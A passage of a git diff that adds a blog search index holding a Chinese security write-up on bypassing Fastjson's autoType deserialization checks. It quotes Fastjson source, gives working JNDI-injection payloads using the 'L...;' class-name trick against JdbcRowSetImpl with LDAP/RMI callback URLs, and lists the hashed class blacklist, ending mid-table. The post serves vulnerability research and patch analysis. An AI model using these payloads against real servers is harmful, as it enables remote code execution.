@@ -1,6 +1,922 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
+    <title>Fastjson抗争的一生</title>
+    <url>/Fastjson%E6%8A%97%E4%BA%89%E7%9A%84%E4%B8%80%E7%94%9F/</url>
+    <content><![CDATA[<h1 id="序言"><a href="#序言" class="headerlink" title="序言"></a>序言</h1><blockquote>
+<p>百川东到海，何时复西归？</p>
+</blockquote>
+<p>这一篇来总结Fastjson不同版本的bypass方式。</p>
+<a id="more"></a>
+
+<h1 id="1-2-24漏洞修复"><a href="#1-2-24漏洞修复" class="headerlink" title="1.2.24漏洞修复"></a>1.2.24漏洞修复</h1><p>在1.2.25版本，针对1.2.24版本进行了修复。</p>
+<p>我们可以总结以下1.2.24版本的漏洞产生原因：</p>
+<ol>
+<li><code>@type</code>该关键词的特性会加载任意类，并给提供的输入字段的值进行恢复，如果字段有setter、getter方法会自动调用该方法，进行赋值，恢复出整个类。<br>这个过程会被叫做Fastjson的反序列化过程，注意不要把这个过程跟java反序列化过程混为一谈。它们两个是同等级的存在，而不是前者基于后者之上。也就是说readObject()反序列化利用点那一套在这根本不适用。相应的被屏蔽的type加载任意类+符合条件的setter与getter变成了反序列化利用点。</li>
+<li>在找到可以调用的setter、getter之后，从这个可以被触发的setter、getter之后就可以沿着不同的反序列化利用链前进，比如具有一定限制条件的TemplatesImpl利用链，JNDI注入的利用链。</li>
+<li>沿着链就会到最后的payload触发点。比如JNDI的远程恶意class文件的实例化操作（构造函数，静态方法）或调用类中getObjectInstance方法，与TemplatesImpl利用链中的class文件字节码的的实例化操作（构造函数，静态方法）。</li>
+</ol>
+<p>可以注意到最终的payload触发点具有好像是巧合的统一性，都类似于是一个class文件的实例化操作。在commons-collections中则是反射机制（这在被屏蔽的type中的getter、setter函数调用中也被用到）。应该对这两个点产生敏感性。</p>
+<p>修复则是针对三要素中的一者进行截断。在1.2.25中的修复原理就是针对了反序列化漏洞触发点进行限制。对于<code>被屏蔽的type</code>标签进行一个白名单+黑名单的限制机制。</p>
+<p>使用万能的idea对两个版本的jar包进行对比：</p>
+<p><img src="../images/Fastjson%E6%8A%97%E4%BA%89%E7%9A%84%E4%B8%80%E7%94%9F/20200102094428-69e0459c-2d01-1.jpg" alt="img"></p>
+<p>可以注意到，在解析json串的<code>DefaultJSONParser类</code>中做了一行代码的修改。当输入的键值是<code>@type</code>时，原本直接对值对应的类进行加载。现在会将值ref传入<code>checkAutoType方法</code>中。</p>
+<p>checkAutoType是1.2.25版本中新增的一个白名单+黑名单机制。同时引入一个配置参数<code>AutoTypeSupport</code>。参考<a href="https://github.com/alibaba/fastjson/wiki/enable_autotype" target="_blank" rel="noopener">官方wiki</a></p>
+<p>Fastjson默认AutoTypeSupport为False（开启白名单机制），通过需要服务端通过以下代码来显性修改：</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">ParserConfig.getGlobalInstance().setAutoTypeSupport(<span class="keyword">true</span>); （关闭白名单机制）</span><br></pre></td></tr></table></figure>
+
+<p>可见，False为禁止自动转换，true为允许自动转换。</p>
+<p>由于checkAutoType中两条路线的代码是穿插的，先来看默认<code>AutoTypeSupport</code>为False时的代码。</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> Class&lt;?&gt; checkAutoType(String typeName, Class&lt;?&gt; expectClass) &#123;</span><br><span class="line">        <span class="keyword">if</span> (typeName == <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">final</span> String className = typeName.replace(<span class="string">'$'</span>, <span class="string">'.'</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//一些固定类型的判断，此处不会对clazz进行赋值，此处省略</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!autoTypeSupport) &#123;</span><br><span class="line">            <span class="comment">//进行黑名单匹配，匹配中，直接报错退出</span></span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; denyList.length; ++i) &#123;</span><br><span class="line">                String deny = denyList[i];</span><br><span class="line">                <span class="keyword">if</span> (className.startsWith(deny)) &#123;</span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> JSONException(<span class="string">"autoType is not support. "</span> + typeName);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">//对白名单，进行匹配；如果匹配中，调用loadClass加载，赋值clazz直接返回</span></span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; acceptList.length; ++i) &#123;</span><br><span class="line">                String accept = acceptList[i];</span><br><span class="line">                <span class="keyword">if</span> (className.startsWith(accept)) &#123;</span><br><span class="line">                    clazz = TypeUtils.loadClass(typeName, defaultClassLoader);</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">if</span> (expectClass != <span class="keyword">null</span> &amp;&amp; expectClass.isAssignableFrom(clazz)) &#123;</span><br><span class="line">                        <span class="keyword">throw</span> <span class="keyword">new</span> JSONException(<span class="string">"type not match. "</span> + typeName + <span class="string">" -&gt; "</span> + expectClass.getName());</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">return</span> clazz;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//此处省略了当clazz不为null时的处理情况，与expectClass有关</span></span><br><span class="line">        <span class="comment">//但是我们这里输入固定是null，不执行此处代码</span></span><br><span class="line">        <span class="comment">//可以发现如果上面没有触发黑名单，返回，也没有触发白名单匹配中的话，就会在此处被拦截报错返回。</span></span><br><span class="line">        <span class="keyword">if</span> (!autoTypeSupport) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> JSONException(<span class="string">"autoType is not support. "</span> + typeName);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//执行不到此处</span></span><br><span class="line">        <span class="keyword">return</span> clazz;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>大体流程就是先过黑名单，再过白名单，要是都不适配，最后也会报错。</p>
+<p>可以得出在默认的<code>AutoTypeSupport为False</code>时，要求不匹配到黑名单，同时必须匹配到白名单的class才可以成功加载。</p>
+<p>看一下默认黑名单，默认白名单（最下面，默认为空）</p>
+<p><img src="../images/Fastjson%E6%8A%97%E4%BA%89%E7%9A%84%E4%B8%80%E7%94%9F/20200102094428-6a060516-2d01-1.jpg" alt="img"></p>
+<p>这条路完全被白名单堵死了,所以默认的情况下是不可能绕过的。我们的两个payload也都被com.sun这一条黑名单给匹配了。</p>
+<h1 id="1-2-25-1-2-41绕过"><a href="#1-2-25-1-2-41绕过" class="headerlink" title="1.2.25-1.2.41绕过"></a>1.2.25-1.2.41绕过</h1><p>所以接下来所谓的绕过都是在服务端显性开启<code>AutoTypeSupport为True</code>的情况下进行的。（这是一个很大的限制条件）</p>
+<p>我们先来看显性修改<code>AutoTypeSupport为True</code>时的代码：</p>
+<p>1.2.25版本com.alibaba.fastjson.parser.ParserConfig#checkAutoType(关闭白名单机制) 也就是true。</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> Class&lt;?&gt; checkAutoType(String typeName, Class&lt;?&gt; expectClass) &#123;</span><br><span class="line">        <span class="keyword">if</span> (typeName == <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">final</span> String className = typeName.replace(<span class="string">'$'</span>, <span class="string">'.'</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (autoTypeSupport || expectClass != <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="comment">//先进行白名单匹配，如果匹配成功则直接返回。可见所谓的关闭白名单机制是不只限于白名单</span></span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; acceptList.length; ++i) &#123;</span><br><span class="line">                String accept = acceptList[i];</span><br><span class="line">                <span class="keyword">if</span> (className.startsWith(accept)) &#123;</span><br><span class="line">                    <span class="keyword">return</span> TypeUtils.loadClass(typeName, defaultClassLoader);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">           <span class="comment">//同样进行黑名单匹配，如果匹配成功，则报错推出。</span></span><br><span class="line">            <span class="comment">//需要注意这百年所谓的匹配都是startsWith开头匹配</span></span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; denyList.length; ++i) &#123;</span><br><span class="line">                String deny = denyList[i];</span><br><span class="line">                <span class="keyword">if</span> (className.startsWith(deny)) &#123;</span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> JSONException(<span class="string">"autoType is not support. "</span> + typeName);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//一些固定类型的判断，不会对clazz进行赋值，此处省略</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">//不匹配白名单中也不匹配黑名单的，进入此处，进行class加载</span></span><br><span class="line">        <span class="keyword">if</span> (autoTypeSupport || expectClass != <span class="keyword">null</span>) &#123;</span><br><span class="line">            clazz = TypeUtils.loadClass(typeName, defaultClassLoader);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//对于加载的类进行危险性判断，判断加载的clazz是否继承自Classloader与DataSource</span></span><br><span class="line">        <span class="keyword">if</span> (clazz != <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (ClassLoader<span class="class">.<span class="keyword">class</span>.<span class="title">isAssignableFrom</span>(<span class="title">clazz</span>) // <span class="title">classloader</span> <span class="title">is</span> <span class="title">danger</span></span></span><br><span class="line"><span class="class">                    || <span class="title">DataSource</span>.<span class="title">class</span>.<span class="title">isAssignableFrom</span>(<span class="title">clazz</span>) // <span class="title">dataSource</span> <span class="title">can</span> <span class="title">load</span> <span class="title">jdbc</span> <span class="title">driver</span></span></span><br><span class="line"><span class="class">                    ) </span>&#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> JSONException(<span class="string">"autoType is not support. "</span> + typeName);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (expectClass != <span class="keyword">null</span>) &#123;</span><br><span class="line">                <span class="keyword">if</span> (expectClass.isAssignableFrom(clazz)) &#123;</span><br><span class="line">                    <span class="keyword">return</span> clazz;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> JSONException(<span class="string">"type not match. "</span> + typeName + <span class="string">" -&gt; "</span> + expectClass.getName());</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//返回加载的class</span></span><br><span class="line">        <span class="keyword">return</span> clazz;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>可见在显性关闭白名单的情况下，也需要绕过黑名单检测，同时加载的类不能继承自Classloader与DataSource。</p>
+<p>看似只能找到其他的利用类跟黑名单进行硬刚。但再跟一下类的加载<code>TypeUtils.loadClass</code>就会有所发现。</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Class&lt;?&gt; loadClass(String className, ClassLoader classLoader) &#123;</span><br><span class="line">        <span class="keyword">if</span> (className == <span class="keyword">null</span> || className.length() == <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        Class&lt;?&gt; clazz = mappings.get(className);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (clazz != <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> clazz;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//特殊处理1！</span></span><br><span class="line">        <span class="keyword">if</span> (className.charAt(<span class="number">0</span>) == <span class="string">'['</span>) &#123;</span><br><span class="line">            Class&lt;?&gt; componentType = loadClass(className.substring(<span class="number">1</span>), classLoader);</span><br><span class="line">            <span class="keyword">return</span> Array.newInstance(componentType, <span class="number">0</span>).getClass();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//特殊处理2！</span></span><br><span class="line">        <span class="keyword">if</span> (className.startsWith(<span class="string">"L"</span>) &amp;&amp; className.endsWith(<span class="string">";"</span>)) &#123;</span><br><span class="line">            String newClassName = className.substring(<span class="number">1</span>, className.length() - <span class="number">1</span>);</span><br><span class="line">            <span class="keyword">return</span> loadClass(newClassName, classLoader);</span><br><span class="line">        &#125;</span><br><span class="line">    ...</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><p>如果这个className是以<code>[</code>开头我们会去掉<code>[</code>进行加载！</p>
+<p>但是实际上在代码中也可以看见它会返回Array的实例变成数组。在实际中它远远不会执行到这一步，在json串解析时就已经报错。</p>
+</li>
+<li><p>如果这个className是以<code>L</code>开头<code>;</code>结尾，就会去掉开头和结尾进行加载！</p>
+</li>
+</ul>
+<p>那么加上<code>L</code>开头<code>;</code>结尾实际上就可以绕过所有黑名单。那么理所当然的payload就为：</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">LDAP：</span><br><span class="line">String payload = <span class="string">"&#123;\"@type\":\"Lcom.sun.rowset.JdbcRowSetImpl;\",\"dataSourceName\":\"ldap://localhost:1389/Exploit\", \"autoCommit\":true&#125;"</span>;</span><br><span class="line"></span><br><span class="line">RMI：</span><br><span class="line">&#123;<span class="string">"@type"</span>:<span class="string">"Lcom.sun.rowset.RowSetImpl;"</span>,<span class="string">"dataSourceName"</span>:<span class="string">"rmi://localhost:1099/Exploit"</span>,<span class="string">"autoCommit"</span>:<span class="keyword">true</span>&#125;</span><br></pre></td></tr></table></figure>
+
+<p>关键PoC为：<code>Lcom.sun.rowset.JdbcRowSetImpl;</code>/<code>Lcom.sun.rowset.RowSetImpl;</code></p>
+<p>注意是要开启AutoTypeSupport的，添加以下代码就ok了：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ParserConfig.getGlobalInstance().setAutoTypeSupport(true);</span><br></pre></td></tr></table></figure>
+
+<p>直接运行即可绕过checkAutoType()黑名单实现弹计算器：</p>
+<p><img src="../images/Fastjson%E6%8A%97%E4%BA%89%E7%9A%84%E4%B8%80%E7%94%9F/image-20200706121236438.png" alt="image-20200706121236438"></p>
+<h2 id="绕过分析"><a href="#绕过分析" class="headerlink" title="绕过分析"></a>绕过分析</h2><p>我们注意到，PoC和之前的不同之处在于在”com.sun.rowset.JdbcRowSetImpl”类名的前面加了”L”、后面加了”;”就绕过了黑名单过滤。</p>
+<p>下面我们调试分析看看为啥会绕过。</p>
+<p>我们将断点打在checkAutoType()函数上，调试跟进去，”Lcom.sun.rowset.JdbcRowSetImpl;”类名由于是以”L”开头，因此并不在denyList黑名单中，从而绕过了黑名单校验:</p>
+<p><img src="../images/Fastjson%E6%8A%97%E4%BA%89%E7%9A%84%E4%B8%80%E7%94%9F/image-20200706124435820.png" alt="image-20200706124435820"></p>
+<p>再往下开始调用TypeUtils.loadClass()：</p>
+<p><img src="../images/Fastjson%E6%8A%97%E4%BA%89%E7%9A%84%E4%B8%80%E7%94%9F/3.png" alt="img"></p>
+<p>跟进TypeUtils.loadClass()函数，这里我们在之前的文章中年已经调试分析过了，也提示过了，就是会有个判断条件判断类名是否以”L”开头、以”;”结尾，是的话就提取出其中的类名再加载进来，因此能成功绕过：</p>
+<p><img src="../images/Fastjson%E6%8A%97%E4%BA%89%E7%9A%84%E4%B8%80%E7%94%9F/image-20200706125048392.png" alt="image-20200706125048392"></p>
+<h1 id="1-2-42-漏洞修复"><a href="#1-2-42-漏洞修复" class="headerlink" title="1.2.42 漏洞修复"></a>1.2.42 漏洞修复</h1><p>自1.2.42版本开始，在ParserConfig.java中可以看到黑名单改为了哈希黑名单：</p>
+<p><img src="../images/Fastjson%E6%8A%97%E4%BA%89%E7%9A%84%E4%B8%80%E7%94%9F/image-20200706125426393.png" alt="image-20200706125426393"></p>
+<p>从1.2.42版本开始，Fastjson把原本明文形式的黑名单改成了哈希过的黑名单，目的就是为了防止安全研究者对其进行研究，提高漏洞利用门槛，但是有人已在Github上跑出了大部分黑名单包类：<a href="https://github.com/LeadroyaL/fastjson-blacklist" target="_blank" rel="noopener">https://github.com/LeadroyaL/fastjson-blacklist</a></p>
+<p>目前已知的哈希黑名单的对应表如下：</p>
+<table>
+<thead>
+<tr>
+<th>version</th>
+<th>hash</th>
+<th>hex-hash</th>
+<th>name</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>1.2.42</td>
+<td>-8720046426850100497</td>
+<td>0x86fc2bf9beaf7aefL</td>
+<td>org.apache.commons.collections4.comparators</td>
+</tr>
+<tr>
+<td>1.2.42</td>
+<td>-8109300701639721088</td>
+<td>0x8f75f9fa0df03f80L</td>
+<td>org.python.core</td>
+</tr>
+<tr>
+<td>1.2.42</td>
+<td>-7966123100503199569</td>
+<td>0x9172a53f157930afL</td>
+<td>org.apache.tomcat</td>
+</tr>
+<tr>
+<td>1.2.42</td>
+<td>-7766605818834748097</td>
+<td>0x9437792831df7d3fL</td>
+<td>org.apache.xalan</td>
+</tr>
+<tr>
+<td>1.2.42</td>
+<td>-6835437086156813536</td>
+<td>0xa123a62f93178b20L</td>
+<td>javax.xml</td>
+</tr>
+<tr>
+<td>1.2.42</td>
+<td>-4837536971810737970</td>
+<td>0xbcdd9dc12766f0ceL</td>
+<td>org.springframework.</td>
+</tr>
+<tr>
+<td>1.2.42</td>
+<td>-4082057040235125754</td>
+<td>0xc7599ebfe3e72406L</td>
+<td>org.apache.commons.beanutils</td>
+</tr>
+<tr>
+<td>1.2.42</td>
+<td>-2364987994247679115</td>
+<td>0xdf2ddff310cdb375L</td>
+<td>org.apache.commons.collections.Transformer</td>
+</tr>
+<tr>
+<td>1.2.42</td>
+<td>-1872417015366588117</td>
+<td>0xe603d6a51fad692bL</td>
+<td>org.codehaus.groovy.runtime</td>
+</tr>
+<tr>
+<td>1.2.42</td>
+<td>-254670111376247151</td>
+<td>0xfc773ae20c827691L</td>
+<td>java.lang.Thread</td>
+</tr>
+<tr>
+<td>1.2.42</td>
+<td>-190281065685395680</td>
+<td>0xfd5bfc610056d720L</td>
+<td>javax.net.</td>
+</tr>
+<tr>
+<td>1.2.42</td>
+<td>313864100207897507</td>
+<td>0x45b11bc78a3aba3L</td>
+<td>com.mchange</td>
+</tr>
+<tr>
+<td>1.2.42</td>
+<td>1203232727967308606</td>
+<td>0x10b2bdca849d9b3eL</td>
+<td>org.apache.wicket.util</td>
+</tr>
+<tr>
+<td>1.2.42</td>
+<td>1502845958873959152</td>
+<td>0x14db2e6fead04af0L</td>
+<td>java.util.jar.</td>
+</tr>
+<tr>
+<td>1.2.42</td>
+<td>3547627781654598988</td>
+<td>0x313bb4abd8d4554cL</td>
+<td>org.mozilla.javascript</td>
+</tr>
+<tr>
+<td>1.2.42</td>
+<td>3730752432285826863</td>
+<td>0x33c64b921f523f2fL</td>
+<td>java.rmi</td>
+</tr>
+<tr>
+<td>1.2.42</td>
+<td>3794316665763266033</td>
+<td>0x34a81ee78429fdf1L</td>
+<td>java.util.prefs.</td>
+</tr>
+<tr>
+<td>1.2.42</td>
+<td>4147696707147271408</td>
+<td>0x398f942e01920cf0L</td>
+<td>com.sun.</td>
+</tr>
+<tr>
+<td>1.2.42</td>
+<td>5347909877633654828</td>
+<td>0x4a3797b30328202cL</td>
+<td>java.util.logging.</td>
+</tr>
+<tr>
+<td>1.2.42</td>
+<td>5450448828334921485</td>
+<td>0x4ba3e254e758d70dL</td>
+<td>org.apache.bcel</td>
+</tr>
+<tr>
+<td>1.2.42</td>
+<td>5751393439502795295</td>
+<td>0x4fd10ddc6d13821fL</td>
+<td>java.net.Socket</td>
+</tr>
+<tr>
+<td>1.2.42</td>
+<td>5944107969236155580</td>
+<td>0x527db6b46ce3bcbcL</td>
+<td>org.apache.commons.fileupload</td>
+</tr>
+<tr>
+<td>1.2.42</td>
+<td>6742705432718011780</td>
+<td>0x5d92e6ddde40ed84L</td>
+<td>org.jboss</td>
+</tr>
+<tr>
+<td>1.2.42</td>
+<td>7179336928365889465</td>
+<td>0x63a220e60a17c7b9L</td>
+<td>org.hibernate</td>
+</tr>
+<tr>
+<td>1.2.42</td>
+<td>7442624256860549330</td>
+<td>0x6749835432e0f0d2L</td>
+<td>org.apache.commons.collections.functors</td>
+</tr>
+<tr>
+<td>1.2.42</td>
+<td>8838294710098435315</td>
+<td>0x7aa7ee3627a19cf3L</td>
+<td>org.apache.myfaces.context.servlet</td>
+</tr>
+<tr>
+<td>1.2.43</td>
+<td>-2262244760619952081</td>
+<td>0xe09ae4604842582fL</td>
+<td>java.net.URL</td>
+</tr>
+<tr>
+<td>1.2.46</td>
+<td>-8165637398350707645</td>
+<td>0x8eadd40cb2a94443L</td>
+<td>junit.</td>
+</tr>
+<tr>
+<td>1.2.46</td>
+<td>-8083514888460375884</td>
+<td>0x8fd1960988bce8b4L</td>
+<td>org.apache.ibatis.datasource</td>
+</tr>
+<tr>
+<td>1.2.46</td>
+<td>-7921218830998286408</td>
+<td>0x92122d710e364fb8L</td>
+<td>org.osjava.sj.</td>
+</tr>
+<tr>
+<td>1.2.46</td>
+<td>-7768608037458185275</td>
+<td>0x94305c26580f73c5L</td>
+<td>org.apache.log4j.</td>
+</tr>
+<tr>
+<td>1.2.46</td>
+<td>-6179589609550493385</td>
+<td>0xaa3daffdb10c4937L</td>
+<td>org.logicalcobwebs.</td>
+</tr>
+<tr>
+<td>1.2.46</td>
+<td>-5194641081268104286</td>
+<td>0xb7e8ed757f5d13a2L</td>
+<td>org.apache.logging.</td>
+</tr>
+<tr>
+<td>1.2.46</td>
+<td>-3935185854875733362</td>
+<td>0xc963695082fd728eL</td>
+<td>org.apache.commons.dbcp</td>
+</tr>
+<tr>
+<td>1.2.46</td>
+<td>-2753427844400776271</td>
+<td>0xd9c9dbf6bbd27bb1L</td>
+<td>com.ibatis.sqlmap.engine.datasource</td>
+</tr>
+<tr>
+<td>1.2.46</td>
+<td>-1589194880214235129</td>
+<td>0xe9f20bad25f60807L</td>
+<td>org.jdom.</td>
+</tr>
+<tr>
+<td>1.2.46</td>
+<td>1073634739308289776</td>
+<td>0xee6511b66fd5ef0L</td>
+<td>org.slf4j.</td>
+</tr>
+<tr>
+<td>1.2.46</td>
+<td>5688200883751798389</td>
+<td>0x4ef08c90ff16c675L</td>
+<td>javassist.</td>
+</tr>
+<tr>
+<td>1.2.46</td>
+<td>7017492163108594270</td>
+<td>0x616323f12c2ce25eL</td>
+<td>oracle.net</td>
+</tr>
+<tr>
+<td>1.2.46</td>
+<td>8389032537095247355</td>
+<td>0x746bd4a53ec195fbL</td>
+<td>org.jaxen.</td>
+</tr>
+<tr>
+<td>1.2.48</td>
+<td>1459860845934817624</td>
+<td>0x144277b467723158L</td>
+<td>java.net.InetAddress</td>
+</tr>
+<tr>
+<td>1.2.48</td>
+<td>8409640769019589119</td>
+<td>0x74b50bb9260e31ffL</td>
+<td>java.lang.Class</td>
+</tr>
+<tr>
+<td>1.2.49</td>
+<td>4904007817188630457</td>
+<td>0x440e89208f445fb9L</td>
+<td>com.alibaba.fastjson.annotation</td>
+</tr>
+<tr>
+<td>1.2.59</td>
+<td>5100336081510080343</td>
+<td>0x46c808a4b5841f57L</td>
+<td>org.apache.cxf.jaxrs.provider.</td>
+</tr>
+<tr>
+<td>1.2.59</td>
+<td>6456855723474196908</td>
+<td>0x599b5c1213a099acL</td>
+<td>ch.qos.logback.</td>
+</tr>
+<tr>
+<td>1.2.59</td>
+<td>8537233257283452655</td>
+<td>0x767a586a5107feefL</td>
+<td>net.sf.ehcache.transaction.manager.</td>
+</tr>
+<tr>
+<td>1.2.60</td>
+<td>3688179072722109200</td>
+<td>0x332f0b5369a18310L</td>
+<td>com.zaxxer.hikari.</td>
+</tr>
+<tr>
+<td>1.2.61</td>
+<td>-4401390804044377335</td>
+<td>0xc2eb1e621f439309L</td>
+<td>flex.messaging.util.concurrent.AsynchBeansWorkManagerExecutor</td>
+</tr>
+<tr>
+<td>1.2.61</td>
+<td>-1650485814983027158</td>
+<td>0xe9184be55b1d962aL</td>
+<td>org.apache.openjpa.ee.</td>
+</tr>
+<tr>
+<td>1.2.61</td>
+<td>-1251419154176620831</td>
+<td>0xeea210e8da2ec6e1L</td>
+<td>oracle.jdbc.rowset.OracleJDBCRowSet</td>
+</tr>
+<tr>
+<td>1.2.61</td>
+<td>-9822483067882491</td>
+<td>0xffdd1a80f1ed3405L</td>
+<td>com.mysql.cj.jdbc.admin.</td>
+</tr>
+<tr>
+<td>1.2.61</td>
+<td>99147092142056280</td>
+<td>0x1603dc147a3e358L</td>
+<td>oracle.jdbc.connector.OracleManagedConnectionFactory</td>
+</tr>
+<tr>
+<td>1.2.61</td>
+<td>3114862868117605599</td>
+<td>0x2b3a37467a344cdfL</td>
+<td>org.apache.ibatis.parsing.</td>
+</tr>
+<tr>
+<td>1.2.61</td>
+<td>4814658433570175913</td>
+<td>0x42d11a560fc9fba9L</td>
+<td>org.apache.axis2.jaxws.spi.handler.</td>
+</tr>
+<tr>
+<td>1.2.61</td>
+<td>6511035576063254270</td>
+<td>0x5a5bd85c072e5efeL</td>
+<td>jodd.db.connection.</td>
+</tr>
+<tr>
+<td>1.2.61</td>
+<td>8925522461579647174</td>
+<td>0x7bddd363ad3998c6L</td>
+<td>org.apache.commons.configuration.JNDIConfiguration</td>
+</tr>
+<tr>
+<td>1.2.62</td>
+<td>-9164606388214699518</td>
+<td>0x80d0c70bcc2fea02L</td>
+<td>org.apache.ibatis.executor.</td>
+</tr>
+<tr>
+<td>1.2.62</td>
+<td>-8649961213709896794</td>
+<td>0x87f52a1b07ea33a6L</td>
+<td>net.sf.cglib.</td>
+</tr>
+<tr>
+<td>1.2.62</td>
+<td>-5764804792063216819</td>
+<td>0xafff4c95b99a334dL</td>
+<td>com.mysql.cj.jdbc.MysqlDataSource</td>
+</tr>
+<tr>
+<td>1.2.62</td>
+<td>-4438775680185074100</td>
+<td>0xc2664d0958ecfe4cL</td>
+<td>aj.org.objectweb.asm.</td>
+</tr>
+<tr>
+<td>1.2.62</td>
+<td>-3319207949486691020</td>
+<td>0xd1efcdf4b3316d34L</td>
+<td>oracle.jdbc.</td>
+</tr>
+<tr>
+<td>1.2.62</td>
+<td>-2192804397019347313</td>
+<td>0xe1919804d5bf468fL</td>
+<td>org.apache.commons.collections.comparators.</td>
+</tr>
+<tr>
+<td>1.2.62</td>
+<td>-2095516571388852610</td>
+<td>0xe2eb3ac7e56c467eL</td>
+<td>net.sf.ehcache.hibernate.</td>
+</tr>
+<tr>
+<td>1.2.62</td>
+<td>4750336058574309</td>
+<td>0x10e067cd55c5e5L</td>
+<td>com.mysql.cj.log.</td>
+</tr>
+<tr>
+<td>1.2.62</td>
+<td>218512992947536312</td>
+<td>0x3085068cb7201b8L</td>
+<td>org.h2.jdbcx.</td>
+</tr>
+<tr>
+<td>1.2.62</td>
+<td>823641066473609950</td>
+<td>0xb6e292fa5955adeL</td>
+<td>org.apache.commons.logging.</td>
+</tr>
+<tr>
+<td>1.2.62</td>
+<td>1534439610567445754</td>
+<td>0x154b6cb22d294cfaL</td>
+<td>org.apache.ibatis.reflection.</td>
+</tr>
+<tr>
+<td>1.2.62</td>
+<td>1818089308493370394</td>
+<td>0x193b2697eaaed41aL</td>
+<td>org.h2.server.</td>
+</tr>
+<tr>
+<td>1.2.62</td>
+<td>2164696723069287854</td>
+<td>0x1e0a8c3358ff3daeL</td>
+<td>org.apache.ibatis.datasource.</td>
+</tr>
+<tr>
+<td>1.2.62</td>
+<td>2653453629929770569</td>
+<td>0x24d2f6048fef4e49L</td>
+<td>org.objectweb.asm.</td>
+</tr>
+<tr>
+<td>1.2.62</td>
+<td>2836431254737891113</td>
+<td>0x275d0732b877af29L</td>
+<td>flex.messaging.util.concurrent.</td>
+</tr>
+<tr>
+<td>1.2.62</td>
+<td>3089451460101527857</td>
+<td>0x2adfefbbfe29d931L</td>
+<td>org.apache.ibatis.javassist.</td>
+</tr>
+<tr>
+<td>1.2.62</td>
+<td>3718352661124136681</td>
+<td>0x339a3e0b6beebee9L</td>
+<td>org.apache.ibatis.ognl.</td>
+</tr>
+<tr>
+<td>1.2.62</td>
+<td>4046190361520671643</td>
+<td>0x3826f4b2380c8b9bL</td>
+<td>com.mysql.cj.jdbc.MysqlConnectionPoolDataSource</td>
+</tr>
+<tr>
+<td>1.2.62</td>
+<td>6280357960959217660</td>
+<td>0x5728504a6d454ffcL</td>
+<td>org.apache.ibatis.scripting.</td>
+</tr>
+<tr>
+<td>1.2.62</td>
+<td>6734240326434096246</td>
+<td>0x5d74d3e5b9370476L</td>
+<td>com.mysql.cj.jdbc.MysqlXADataSource</td>
+</tr>
+<tr>
+<td>1.2.62</td>
+<td>7123326897294507060</td>
+<td>0x62db241274397c34L</td>
+<td>org.apache.commons.collections.functors.</td>
+</tr>
+<tr>
+<td>1.2.62</td>
+<td>8488266005336625107</td>
+<td>0x75cc60f5871d0fd3L</td>
+<td>org.apache.commons.configuration</td>
+</tr>
+</tbody></table>
+<p>目前未知的哈希黑名单：</p>
+<table>
+<thead>
+<tr>
+<th>version</th>
+<th>hash</th>
+<th>hex-hash</th>
+<th>name</th>
